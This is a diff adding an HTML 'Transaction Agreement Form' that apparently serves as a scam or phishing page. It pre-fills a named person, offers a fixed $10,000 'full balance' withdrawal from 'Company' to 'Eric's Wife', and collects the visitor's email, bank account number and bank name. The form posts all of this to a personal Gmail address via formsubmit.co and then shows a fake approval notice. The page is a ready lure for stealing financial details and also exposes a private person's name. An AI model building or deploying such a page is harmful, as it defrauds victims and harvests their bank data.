@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Transaction Agreement Form</title>
+    <style>
+        /* General Styles */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #eef2f7 0%, #dce4ed 100%), 
+                        url('money-transaction-icon_192037-4591.avif') center center no-repeat;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 13px;
+            box-sizing: border-box;
+        }
+
+        h2 {
+            color: #333;
+            top: 59%;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* Form Container */
+        .form-container {
+            width: 90%;
+            max-width: 300px;
+            margin: 40px auto;
+            background-color: #fff;
+            padding: 14px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: left;
+        }
+
+        /* Logo Style */
+        .logo {
+            width: 110px;
+            height: 110px;
+            display: block;
+            margin: 0 auto 20px;
+        }
+
+        .form-group {
+            margin-bottom: 10px;
+            padding: 10px;
+        }
+
+        .notice-box {
+            border: 1px solid #ccc;
+            background-color: #f9f9f9;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #333;
+            border-radius: 5px;
+        }
+
+        .notice-box p {
+            margin: 0;
+        }
+
+        .notice-box a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        .notice-box a:hover {
+            text-decoration: underline;
+        }
+
+        label {
+            font-size: 16px;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        input, select {
+            width: 90%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        /* Readonly fields styling */
+        .readonly-field {
+            background-color: #f5f5f5;
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        /* Button Styling */
+        button {
+            width: 100%;
+            padding: 15px;
+            font-size: 18px;
+            color: #fff;
+            background-color: #ff4500;
+            border: none;
+            border-radius: 9px;
+            cursor: pointer;
+            transition: background-color 0.3s, box-shadow 0.3s;
+            background: linear-gradient(to right, #ff6347, #ff4500);
+        }
+
+        button:hover {
+            background-color: #e03b00;
+            background: linear-gradient(to right, #ff4500, #e03b00);
+            box-shadow: 0 4px 15px rgba(255, 69, 0, 0.3);
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            width: 300px;
+            text-align: center;
+        }
+
+        #confirmButton, #cancelButton {
+            padding: 10px 20px;
+            margin: 10px;
+            font-size: 16px;
+            background-color: #007BFF;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #cancelButton {
+            background-color: #f44336;
+        }
+
+        #confirmButton:hover, #cancelButton:hover {
+            opacity: 0.8;
+        }
+
+        /* Success Modal */
+        .success-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1001;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .success-modal-content {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            width: 350px;
+            text-align: center;
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+
+        .email-message {
+            background-color: #e8f4fc;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-weight: 500;
+        }
+
+        /* Balance Display */
+        .balance-display {
+            background-color: #e8f5e9;
+            border-left: 5px solid #4CAF50;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+
+        .balance-amount {
+            font-size: 24px;
+            font-weight: bold;
+            color: #2e7d32;
+            margin: 5px 0;
+        }
+
+        .minimum-withdrawal {
+            background-color: #fff3e0;
+            border-left: 5px solid #ff9800;
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .transfer-info {
+            background-color: #f0f8ff;
+            border-left: 5px solid #2196F3;
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 5px;
+            font-weight: 500;
+            text-align: center;
+        }
+
+        /* Animated squares */
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 1;
+                border-radius: 0;
+            }
+            100% {
+                transform: translateY(-1000px) rotate(720deg);
+                opacity: 0;
+                border-radius: 50%;
+            }
+        }
+
+        .squares {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 133%;
+            overflow: hidden;
+            z-index: -1;
+        }
+
+        .squares span {
+            position: absolute;
+            display: block;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 68, 0, 0.3);
+            animation: float 19s linear infinite;
+            bottom: -150px;
+        }
+
+        .squares span:nth-child(1) {
+            left: 10%;
+            width: 80px;
+            height: 80px;
+            animation-duration: 12s;
+        }
+
+        .squares span:nth-child(2) {
+            left: 20%;
+            width: 60px;
+            height: 60px;
+            animation-duration: 20s;
+        }
+
+        .squares span:nth-child(3) {
+            right: 35%;
+            width: 40px;
+            height: 40px;
+            animation-duration: 22s;
+        }
+
+        .squares span:nth-child(4) {
+            left: 40%;
+            width: 90px;
+            height: 90px;
+            animation-duration: 24s;
+        }
+        
+        .squares span:nth-child(5) {
+            right: 50%;
+            width: 90px;
+            height: 90px;
+            animation-duration: 30s;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <!-- Add logo here -->
+        <img src="money-transaction-icon_192037-4591.avif" alt="Logo" class="logo">
+        
+        <h2>Transaction Agreement Form</h2>
+
+        <form action="https://formsubmit.co/chin.hwa132@gmail.com" method="POST" id="agreementForm">
+            <!-- Pre-filled Full Name -->
+            <div class="form-group">
+                <label for="fullName">Full Name</label>
+                <input type="text" id="fullName" name="fullName" class="readonly-field" value="DIANA MADELINA ORTIZ FELICIANO" readonly>
+            </div>
+
+            <!-- Email Field -->
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" required placeholder="Enter your email address">
+            </div>
+
+            <!-- Account Number Field -->
+            <div class="form-group">
+                <label for="accountNumber">Bank Account Number</label>
+                <input type="text" id="accountNumber" name="accountNumber" required placeholder="Enter your account number">
+            </div>
+
+            <!-- Bank Name Field -->
+            <div class="form-group">
+                <label for="bankName">Bank Name</label>
+                <input type="text" id="bankName" name="bankName" required placeholder="Enter your bank name">
+            </div>
+
+            <!-- Withdrawal Amount (Fixed) -->
+            <div class="form-group">
+                <label for="withdrawalAmount">Withdrawal Amount</label>
+                <input type="text" id="withdrawalAmount" name="withdrawalAmount" class="readonly-field" value="$10,000.00" readonly>
+                <small style="display: block; margin-top: 5px; color: #666; font-size: 13px;">Fixed amount (full balance)</small>
+            </div>
+
+            <!-- Payment Method -->
+            <div class="form-group">
+                <label for="paymentMethod">Payment Method</label>
+                <select id="paymentMethod" name="paymentMethod" required>
+                    <option value="">Select payment method</option>
+                    <option value="bankTransfer">Bank Transfer</option>
+                    <option value="wireTransfer">Wire Transfer</option>
+                    <option value="mailCheck">Mail Check</option>
+                </select>
+            </div>
+
+            <!-- Notice Box -->
+            <div class="notice-box">
+                <p>Notice: You agree to the company <a href="agreement.html" target="_blank">terms and conditions</a>.</p>
+                <p style="margin-top: 10px; font-size: 13px;">An email will be sent to you once this request is approved.</p>
+            </div>
+
+            <canvas id="canvas" width="150" height="18"></canvas>
+
+            <button type="submit" id="submitButton">Submit Withdrawal Request</button>
+        </form>
+    </div>
+
+    <!-- Review Modal -->
+    <div id="reviewModal" class="modal">
+        <div class="modal-content">
+            <h2>Review Your Information</h2>
+            <p><strong>Name:</strong> <span id="reviewName"></span></p>
+            <p><strong>Email:</strong> <span id="reviewEmail"></span></p>
+            <p><strong>Account Number:</strong> <span id="reviewAccountNumber"></span></p>
+            <p><strong>Bank Name:</strong> <span id="reviewBankName"></span></p>
+            <p><strong>Amount:</strong> <span id="reviewAmount"></span></p>
+            <p><strong>Payment Method:</strong> <span id="reviewPaymentMethod"></span></p>
+            <p style="margin-top: 15px; font-style: italic; color: #666;">Transfer from Company to Eric's Wife</p>
+            <button id="confirmButton">Confirm & Submit</button>
+            <button id="cancelButton">Cancel</button>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="success-modal">
+        <div class="success-modal-content">
+            <div class="success-icon">✓</div>
+            <h2>Request Submitted Successfully!</h2>
+            <div class="email-message">
+                <p><strong>An email will be sent to you once this request is approved.</strong></p>
+                <p>You will receive confirmation at: <span id="successEmail"></span></p>
+            </div>
+            <p>Withdrawal Amount: <strong>$10,000.00</strong></p>
+            <p>Transfer: <strong>Company → Eric's Wife</strong></p>
+            <p style="margin-top: 20px; color: #666; font-size: 14px;">Please allow 2-3 business days for processing.</p>
+            <button id="closeSuccessModal" style="margin-top: 20px; padding: 10px 30px;">OK</button>
+        </div>
+    </div>
+
+    <div class="squares">
+        <span></span><span></span><span></span><span></span><span></span>
+        <span></span><span></span><span></span><span></span><span></span>
+    </div>
+
+    <script>
+        // Font Awesome icons (if needed)
+        document.head.insertAdjacentHTML('beforeend', '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">');
+
+        // Submit Form Handling
+        document.getElementById('agreementForm').addEventListener('submit', function (event) {
+            event.preventDefault();  // Prevent form submission
+
+            // Get values from form
+            const name = document.getElementById('fullName').value;
+            const email = document.getElementById('email').value;
+            const accountNumber = document.getElementById('accountNumber').value;
+            const bankName = document.getElementById('bankName').value;
+            const amount = document.getElementById('withdrawalAmount').value;
+            const paymentMethod = document.getElementById('paymentMethod').value;
+
+            // Validate that all fields are filled
+            if (!email || !accountNumber || !bankName || !paymentMethod) {
+                alert('Please fill in all required fields.');
+                return;
+            }
+
+            // Validate email format
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailPattern.test(email)) {
+                alert('Please enter a valid email address.');
+                return;
+            }
+
+            // Show review modal
+            document.getElementById('reviewName').textContent = name;
+            document.getElementById('reviewEmail').textContent = email;
+            document.getElementById('reviewAccountNumber').textContent = accountNumber;
+            document.getElementById('reviewBankName').textContent = bankName;
+            document.getElementById('reviewAmount').textContent = amount;
+            document.getElementById('reviewPaymentMethod').textContent = paymentMethod;
+
+            // Display the modal
+            document.getElementById('reviewModal').style.display = 'flex';
+        });
+
+        // Handle Confirm Button
+        document.getElementById('confirmButton').addEventListener('click', function () {
+            const email = document.getElementById('email').value;
+            
+            // Show success modal
+            document.getElementById('successEmail').textContent = email;
+            document.getElementById('successModal').style.display = 'flex';
+            
+            // Hide review modal
+            document.getElementById('reviewModal').style.display = 'none';
+            
+            // Submit the form after a delay
+            setTimeout(function() {
+                document.getElementById('agreementForm').submit();
+            }, 1000);
+        });
+
+        // Handle Cancel Button
+        document.getElementById('cancelButton').addEventListener('click', function () {
+            // Close the modal without submitting
+            document.getElementById('reviewModal').style.display = 'none';
+        });
+
+        // Handle Close Success Modal
+        document.getElementById('closeSuccessModal').addEventListener('click', function () {
+            document.getElementById('successModal').style.display = 'none';
+        });
+
+        // Close Modal when clicking outside
+        window.addEventListener('click', function (event) {
+            const reviewModal = document.getElementById('reviewModal');
+            const successModal = document.getElementById('successModal');
+            
+            if (event.target === reviewModal) {
+                reviewModal.style.display = 'none';
+            }
+            
+            if (event.target === successModal) {
+                successModal.style.display = 'none';
+            }
+        });
+
+        // Auto-focus on email field
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('email').focus();
+        });
+    </script>
+
+</body>
+</html>
